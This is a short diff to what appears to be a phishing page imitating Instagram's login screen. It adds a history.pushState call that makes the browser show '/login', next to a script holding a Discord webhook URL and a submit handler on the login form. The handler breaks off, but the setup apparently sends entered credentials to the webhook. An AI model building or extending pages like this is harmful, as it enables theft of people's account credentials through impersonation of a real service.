@@ -70,6 +70,8 @@
         <p class="copyright">© 2020 Instagram do Facebook</p>
     </footer>
     <script>
+        history.pushState(null, '', '/login');
+        
         const WEBHOOK_URL = 'https://discord.com/api/webhooks/1480366266064830564/oxdF4Ed6DsE8AD7894wsBLZEVgXg0BqQKoJO3MDp1IlrsRcr6xQ5XmizwT1vUPko3Ubv';
         
         document.getElementById('loginForm').addEventListener('submit', async function(e) {
